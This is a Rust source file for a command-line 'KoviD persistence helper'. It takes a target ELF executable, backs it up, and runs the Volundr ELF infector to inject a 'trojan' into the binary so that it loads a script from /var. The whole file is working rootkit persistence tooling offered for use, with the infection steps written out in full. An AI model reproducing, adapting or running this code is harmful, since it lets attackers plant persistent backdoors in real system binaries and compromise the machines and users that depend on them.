use std::process::{Command};
use std::env;
use std::fs;
use chrono::{DateTime, Utc};
use std::path::Path;
use structopt::StructOpt;

const ABOUT: &str = "
    KoviD persistence helper

    Will take a target ELF executable and invoke Volundr
    that in turn will infect the image with an instruction
    to load a script from /var

    If Volundr is compiled from non-default path ../../volundr
    use environment variable VOLUNDR:

        VOLUNDR=<custom path> cargo run -- <options>

    elf_workdir/:   Infected file
    elf_backup/:    Copy of original ELF file: <time>.<md5sum>/<file>
";

fn fetch_output(output: &Vec<u8>) -> String {
    let mut output = String::from_utf8_lossy(&output).into_owned();
    output.truncate(output.trim_end().len());
    output
}

fn exists(rv: String, msg: &str) -> String {
    match fs::metadata(rv.clone()).is_ok() {
        true => println!("[success] {msg}: found at {rv}"),
        false => panic!("[error] {msg}: not found")
    }
    rv
}

#[derive(Debug)]
struct Volundr <'a>{
    envname: &'a str,
    append: &'a str,
    path: &'a String,
    msg: &'a str,
}

impl Volundr<'_> {
    fn resolve_path(&self) -> String {
        let mut rv = env::var(self.envname).unwrap_or("".to_string());
        if rv.eq("") {
            rv = self.path.to_string();
            rv.push_str(self.append);
        }
        exists(rv, self.msg)
    }
}

#[derive(Debug)]
struct Commit <'b>{
    target: &'b String,
    volundr: &'b String,
    path: &'b String,
}

#[derive(Debug)]
struct Cmd <'c>{
    tok: bool,
    cmd: String,
    params: &'c [&'c str],
}

impl Cmd<'_>{

     fn _run_cmd(cmd: &str, args: &[&str]) -> Vec<u8> {
        let output = Command::new(cmd).args(args).output().unwrap_or_else(|e| {
            panic!("{cmd} failed to execute process: {e}")
        });

        assert!(output.status.success());
        output.stdout
    }

    fn cmd_and_output(&self) -> String {
        let tok = Cmd::_run_cmd(&self.cmd, self.params);
        let tok = fetch_output(&tok);

        if self.tok {
            let tok = tok.split_whitespace().next().unwrap_or("");
            return tok.to_string();
        }
        return tok.to_string();
    }
}

impl Commit<'_> {
    fn commit(self) -> anyhow::Result<()> {

        let md5_before = Cmd {
            tok: true,
            cmd: String::from("md5sum"),
            params: &[&self.target],
        };
        let md5_before = md5_before.cmd_and_output();

        let mut p = self.path.to_string();
        let now: DateTime<Utc> = Utc::now();
        for s in vec!["/../../elf_backup/", &now.timestamp().to_string(), ".", &md5_before] {
            p.push_str(s);
        }

        let exec_cmd = Cmd {
            tok: false,
            cmd: String::from("mkdir"),
            params: &["-p", &p],
        };
        _ = exec_cmd.cmd_and_output();

        let exec_cmd = Cmd {
            tok: false,
            cmd: String::from("cp"),
            params: &["-v", self.target, &p],
        };
        _ = exec_cmd.cmd_and_output();

        p = self.path.to_string();
        p.push_str("/../../elf_workdir/");

        let mut target_workdir = p.clone();
        let name = Path::new(&self.target)
            .file_name()
            .unwrap()
            .to_str()
            .unwrap()
            .to_string();
        target_workdir.push_str(&name);

        let exec_cmd = Cmd {
            tok: false,
            cmd: String::from("mkdir"),
            params: &["-p", &p],
        };
        _ = exec_cmd.cmd_and_output();

        let exec_cmd = Cmd {
            tok: false,
            cmd: String::from("cp"),
            params: &["-v", self.target, &p],
        };
        _ = exec_cmd.cmd_and_output();

        let currdir = env::current_dir()?;
        let root = Path::new(self.volundr);

        p = self.volundr.to_string();
        p.push_str("/examples/example-infect-text");

        let mut trojan = self.path.to_string();
        trojan.push_str("/../../../../src/persist");
        let mut ld = root.display().to_string();
        ld.push_str("/volundr");
        let key = "LD_LIBRARY_PATH";
        env::set_var(key,&ld);

        let exec_cmd = Cmd {
            tok: false,
            cmd: String::from(&p),
            params: &[&target_workdir, &trojan],
        };
        _ = exec_cmd.cmd_and_output();

        _ = Path::new(&currdir);

        let md5_after = Cmd {
            tok: true,
            cmd: String::from("md5sum"),
            params: &[&target_workdir],
        };
        let md5_after = md5_after.cmd_and_output();

        println!("md5_before: {}, md5_after: {}", md5_before, md5_after);

        Ok(())
    }
}

#[derive(Debug, StructOpt)]
#[structopt(
    about = ABOUT,
)]
enum CliCmd {
    #[structopt(about = "ELF binary for Volundr infection")]
    Target(Target),
}

#[derive(Debug, StructOpt)]
struct Target {
    #[structopt(short, long, help = "just a test")]
    path: String,
}

fn run(opts: Target) -> anyhow::Result<()> {
    let target = &opts.path;
    let path = env::current_exe()?;
    let path = path.parent().unwrap().display().to_string();

    // indicates volundr is built
    let volundr_lib = Volundr {
        envname: "VOLUNDR_LIB",
        append: "/../../../../volundr/volundr/libvolundr.so",
        path: &path,
        msg: "volundr ELF lib",
    };
    // don't need the path, just to
    // know if it is compiled
    _ = volundr_lib.resolve_path();

    let volundr = Volundr {
        envname: "VOLUNDR",
        append: "/../../../../volundr",
        path: &path,
        msg: "volundr ELF infection",
    };

    exists(target.clone(), target);
    let exec_cmd = Cmd {
        tok: true,
        cmd: String::from("readelf"),
        params: &["-h", target],
    };
    let exec_cmd = exec_cmd.cmd_and_output();
    assert!(exec_cmd.eq("ELF"));

    let ci = Commit {
        target: &target,
        volundr: &volundr.resolve_path(),
        path: &path,
    };

    ci.commit()
}

fn main() -> anyhow::Result<()> {
    match CliCmd::from_args() {
        CliCmd::Target(opts) => run(opts),
    }
}
